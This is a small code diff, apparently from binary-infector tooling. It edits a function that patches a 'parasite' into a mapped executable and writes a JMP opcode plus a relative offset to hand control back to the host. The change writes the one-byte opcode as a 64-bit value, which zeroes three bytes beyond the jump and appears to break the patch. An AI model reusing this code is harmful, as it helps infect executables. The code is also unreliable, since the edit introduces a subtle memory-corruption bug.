@@ -33,9 +33,10 @@ bool patch_parasite_and_relinquish_control(
     CHECK_FAIL();
   }
 
-  constexpr auto branch_op_code = 0xe9;
-  *(mapping.mutable_base() + parasite_offset +
-    patch_offset_from_parasite_start) = branch_op_code;
+  constexpr uint64_t branch_op_code = 0xe9;
+  void* patch_addr = mapping.mutable_base() + parasite_offset +
+    patch_offset_from_parasite_start;
+  *static_cast<uint64_t*>(patch_addr)= branch_op_code;
   *(int32_t*)(mapping.mutable_base() + parasite_offset +
               patch_offset_from_parasite_start + 1) = rel;
 
